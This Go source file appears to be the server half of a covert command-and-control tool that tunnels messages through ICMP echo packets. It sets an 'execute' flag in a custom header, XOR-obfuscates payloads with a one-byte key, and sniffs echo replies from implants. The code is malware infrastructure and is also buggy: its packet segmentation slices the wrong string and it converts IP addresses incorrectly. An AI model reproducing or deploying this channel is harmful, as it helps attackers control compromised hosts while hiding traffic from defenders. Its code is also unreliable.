package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var DEBUG bool = true

var id int = 0
var clients = make(map[int]string)
var SSM bool = true
var execute = false
var PACKETQUEUE []icmp.Message
var KEY rune = 'b'

var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)

const (
	ProtocolICMP = 1
)

func generate_header(segment int, segmented bool) string {
	segHeader := strconv.Itoa(segment)
	header := "###"
	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
	// 3 is segment for oversized packets, 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += segHeader
	return header
}

func send_packets(addr string, c icmp.PacketConn) {
	for _, packet := range PACKETQUEUE {
		// fmt.Println("Packet:", addr)
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}

}

func generate_packet(payload string, segment int) {
	byteSize := len(payload)
	// Recursivly calls generate packet if too large
	if byteSize > 1460 {
		fmt.Println("Conductor we have a problem!!!!!")
		payload := payload[0:1460]
		nextPayload := payload[1460:byteSize]
		if SSM {
			payload = encrypt_decrypt(payload)
		}
		packet := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: os.Getpid() & 0xffff, Seq: 1,
				Data: []byte(generate_header(segment, true) + payload),
			},
		}
		fmt.Println(len(PACKETQUEUE))
		PACKETQUEUE[segment] = packet
		generate_packet(nextPayload, segment+1)
	} else {
		// Packet if no segmentation is needed
		if SSM {
			payload = encrypt_decrypt(payload)
		}
		packet := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: os.Getpid() & 0xffff, Seq: 1,
				Data: []byte(generate_header(segment, false) + payload),
			},
		}
		fmt.Println(len(PACKETQUEUE))
		PACKETQUEUE[segment] = packet
	}
}

func sniffer(c icmp.PacketConn) {
	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := convert(packet.ApplicationLayer().Payload())
		header := payload[0:7]
		if strings.HasPrefix(header, "!!!") {
			payload = payload[7:]
			fmt.Println("Recieved", payload)
			response := "Got it"
			PACKETQUEUE = make([]icmp.Message, (len(response)/1460)+1)
			execute = true
			generate_packet(response, 0)
			if DEBUG {
				fmt.Println("[SENDING]", response)
			}

			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ip, _ := ipLayer.(*layers.IPv4)
			fmt.Println("[FROM]", ip.DstIP)
			go sender(string(ip.DstIP))
		}
	}
}

func sender(dst string) {
	var SendAddr = dst
	d, err := icmp.ListenPacket("ip4:icmp", SendAddr)
	if err != nil {
		fmt.Println(err)
	}
	send_packets(dst, *d) // Need server address
}

func convert(nums []byte) string {
	var converted string
	converted = bytes.NewBuffer(nums).String()
	return converted
}

func encrypt_decrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
	}
	return encrypted
}

func main() {
	var ListenAddr = "0.0.0.0"
	c, err := icmp.ListenPacket("ip4:icmp", ListenAddr)
	if err != nil {
		fmt.Println(err)
	}
	go sniffer(*c)

	consoleReader := bufio.NewReader(os.Stdin)
	fmt.Print(">> ")
	input, _ := consoleReader.ReadString('\n')
	fmt.Println(input)
}
